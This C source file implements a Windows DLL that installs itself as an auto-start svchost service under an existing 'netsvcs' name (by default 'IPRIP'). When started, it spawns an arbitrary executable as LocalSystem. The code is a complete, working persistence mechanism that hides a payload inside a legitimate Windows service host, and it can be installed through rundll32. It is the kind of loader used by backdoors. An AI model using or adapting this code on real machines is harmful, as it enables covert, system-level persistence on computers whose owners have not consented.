#include <stdio.h>
#include <time.h>
#include <assert.h>
#include <windows.h>
#include "isvc.h"

#define DEFAULT_SERVICE "IPRIP"
#define MY_EXECUTE_NAME "SvcHostDLL.exe"

////main service process function
//void __stdcall ServiceMain( int argc, wchar_t* argv[] );
////report service stat to the service control manager
//int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
////service control handler, call back by service control manager
//void __stdcall ServiceHandler( DWORD dwCommand );
////RealService just create a process 
//int RealService(char *cmd, int bInteract);
//
////Install this dll as a Service host by svchost.exe, service name is given by caller
//int InstallService(char *name);
////unInstall a Service, be CARE FOR call this to delete a service
//int UninstallService(char *name);
////Install this dll as a Service host by svchost.exe, used by RUNDLL32.EXE to call
//void __stdcall RundllInstallA(HWND hwnd, HINSTANCE hinst, char *param, int nCmdShow);
////unInstall a Service used by RUNDLL32.EXE to call, be CARE FOR call this to delete a service
//void __stdcall RundllUninstallA(HWND hwnd, HINSTANCE hinst, char *param, int nCmdShow);
//
////output the debug infor into log file(or stderr if a console program call me) & DbgPrint
//void OutputString( char *lpFmt, ... );


//dll module handle used to get dll path in InstallService
HANDLE hDll = NULL;
//Service HANDLE & STATUS used to get service state
SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hDll = hModule;
#ifdef _DEBUG
        AllocConsole();
        OutputString("SvcHostDLL: DllMain called DLL_PROCESS_ATTACH");
        break;

    case DLL_THREAD_ATTACH:
        OutputString("SvcHostDLL: DllMain called DLL_THREAD_ATTACH");
    case DLL_THREAD_DETACH:
        OutputString("SvcHostDLL: DllMain called DLL_THREAD_DETACH");
    case DLL_PROCESS_DETACH:
        TellSCM( SERVICE_STOP_PENDING, 0, 0 );
        Sleep(1500);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        OutputString("SvcHostDLL: DllMain called DLL_PROCESS_DETACH");
#endif
        break;
    }

    return TRUE;
}


void __stdcall ServiceMain( int argc, wchar_t* argv[] )
{
//    DebugBreak();
    char svcname[256];
    strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    OutputString("SvcHostDLL: ServiceMain(%d, %s) called", argc, svcname);

    hSrv = RegisterServiceCtrlHandler( svcname, (LPHANDLER_FUNCTION)ServiceHandler );
    if( hSrv == NULL )
    {
        OutputString("SvcHostDLL: RegisterServiceCtrlHandler %S failed", argv[0]);
        return;
    }else FreeConsole();

    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0 );

    // call Real Service function noew
    if(argc > 1)
        strncpy(svcname, (char*)argv[1], sizeof svcname),
        wcstombs(svcname, argv[1], sizeof svcname);
    RealService(argc > 1 ? svcname : MY_EXECUTE_NAME, argc > 2 ? 1 : 0);

    do{
        Sleep(10);//not quit until receive stop command, otherwise the service will stop
    }while(dwCurrState != SERVICE_STOP_PENDING && dwCurrState != SERVICE_STOPPED);

    OutputString("SvcHostDLL: ServiceMain done");
    return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    srvStatus.dwCurrentState = dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 3000;
    return SetServiceStatus( hSrv, &srvStatus );
}

void __stdcall ServiceHandler( DWORD dwCommand )
{
    // not really necessary because the service stops quickly
    switch( dwCommand )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        OutputString("SvcHostDLL: ServiceHandler called SERVICE_CONTROL_STOP");
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        OutputString("SvcHostDLL: ServiceHandler called SERVICE_CONTROL_PAUSE");
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        OutputString("SvcHostDLL: ServiceHandler called SERVICE_CONTROL_CONTINUE");
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        OutputString("SvcHostDLL: ServiceHandler called SERVICE_CONTROL_INTERROGATE");
        TellSCM( dwCurrState, 0, 0 );
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        OutputString("SvcHostDLL: ServiceHandler called SERVICE_CONTROL_SHUTDOWN");
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    }
}


//RealService just create a process 
int RealService(char *cmd, int bInteract)
{
    OutputString("SvcHostDLL: RealService called '%s' %s", cmd, bInteract ? "Interact" : "");
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    if(bInteract) si.lpDesktop = "WinSta0\\Default"; 
    if(!CreateProcess(NULL, cmd, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
        OutputString("SvcHostDLL: CreateProcess(%s) error:%d", cmd, GetLastError());
    else OutputString("SvcHostDLL: CreateProcess(%s) to %d", cmd, pi.dwProcessId);

    return 0;
}


int InstallService(char *name)
{
    // Open a handle to the SC Manager database. 
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;

    try{
    char buff[500];
    char *svcname = DEFAULT_SERVICE;
    if(name && name[0]) svcname = name;

    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
    if(ERROR_SUCCESS != rc)
    {
        OutputString("RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.", pSvchost, rc); 
        throw "";
    }

    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    RegCloseKey(hkRoot);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegQueryValueEx(Svchost\\netsvcs)";

    for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
        if(stricmp(ptr, svcname) == 0) break;

    if(*ptr == 0)
    {
        OutputString("you specify service name not in Svchost\\netsvcs, must be one of following:"); 
        for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
            OutputString(" - %s", ptr); 
        throw "";
    }

    //install service
    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hscm == NULL) 
        throw "OpenSCManager()";
        
    char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";

    schService = CreateService( 
        hscm,                        // SCManager database 
        svcname,                    // name of service 
        NULL,           // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_SHARE_PROCESS, // service type 
        SERVICE_AUTO_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        bin,        // service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 

    if (schService == NULL)
    {
        OutputString("CreateService(%s) error %d", svcname, rc = GetLastError());
        throw "";
    }
    OutputString("CreateService(%s) SUCCESS. Config it", svcname); 

    CloseServiceHandle(schService); 
    CloseServiceHandle(hscm); 

    //config service
    hkRoot = HKEY_LOCAL_MACHINE;
    strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
    strncat(buff, svcname, 100);
    rc = RegOpenKeyEx(hkRoot, buff, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
    {
        OutputString("RegOpenKeyEx(%s) KEY_SET_VALUE error %d.", svcname, rc); 
        throw "";
    }

    rc = RegCreateKey(hkRoot, "Parameters", &hkParam);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegCreateKey(Parameters)";

    if(!GetModuleFileName(HMODULE(hDll), buff, sizeof buff))
        throw "GetModuleFileName() get dll path";

    rc = RegSetValueEx(hkParam, "ServiceDll", 0, REG_EXPAND_SZ, (unsigned char*)buff, strlen(buff)+1);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegSetValueEx(ServiceDll)";

    OutputString("Config service %s ok.", svcname); 
    }catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
            OutputString("%s error %d", str, rc);
        }
    }

    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService); 
    CloseServiceHandle(hscm); 

    return rc;
}

/*
used to install by rundll32.exe
Platform SDK: Tools - Rundll32
The Run DLL utility (Rundll32.exe) included in Windows enables you to call functions exported from a 32-bit DLL. These functions must have the following syntax:
*/
void CALLBACK RundllInstallA(
  HWND hwnd,        // handle to owner window
  HINSTANCE hinst,  // instance handle for the DLL
  char *param,        // string the DLL will parse
  int nCmdShow      // show state
)
{
    InstallService(param);
}


int UninstallService(char *name)
{
    int rc = 0;
    SC_HANDLE schService;
    SC_HANDLE hscm;

    __try{
    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hscm == NULL) 
    {
        OutputString("OpenSCManager() error %d", rc = GetLastError() ); 
        return rc;
    }

    char *svcname = DEFAULT_SERVICE;
    if(name && name[0]) svcname = name;

    schService = OpenService(hscm, svcname, DELETE);
    if (schService == NULL) 
    {
        OutputString("OpenService(%s) error %d", svcname, rc = GetLastError() ); 
        return rc;
    }

    if (!DeleteService(schService) ) 
    {
        OutputString("OpenService(%s) error %d", svcname, rc = GetLastError() ); 
        return rc;
    }

    OutputString("DeleteService(%s) SUCCESS.", svcname); 
    }__except(1)
    {
        OutputString("Exception Catched 0x%X", GetExceptionCode());
    }

    CloseServiceHandle(schService); 
    CloseServiceHandle(hscm);
    return rc;
}

/*
used to uninstall by rundll32.exe
Platform SDK: Tools - Rundll32
The Run DLL utility (Rundll32.exe) included in Windows enables you to call functions exported from a 32-bit DLL. These functions must have the following syntax:
*/
void CALLBACK RundllUninstallA(
  HWND hwnd,        // handle to owner window
  HINSTANCE hinst,  // instance handle for the DLL
  char *param,        // string the DLL will parse
  int nCmdShow      // show state
)
{
    UninstallService(param);
}

//output the debug infor into log file & DbgPrint
void OutputString( char *lpFmt, ... )
{
    char buff[1024];
    va_list    arglist;
    va_start( arglist, lpFmt );
    _vsnprintf( buff, sizeof buff, lpFmt, arglist );
    va_end( arglist );

    DWORD len;
    HANDLE herr = GetStdHandle(STD_OUTPUT_HANDLE);
    if(herr != INVALID_HANDLE_VALUE)
    {
        WriteFile(herr, buff, strlen(buff), &len, NULL);
        WriteFile(herr, "\r\n", 2, &len, NULL);
    }else
    {
        FILE *fp = fopen("SvcHost.DLL.log", "a");
        if(fp)
        {
            char date[20], time[20];
            fprintf(fp, "%s %s - %s\n", _strdate(date), _strtime(time), buff);
            if(!stderr) fclose(fp);
        }
    }

    OutputDebugString(buff);
}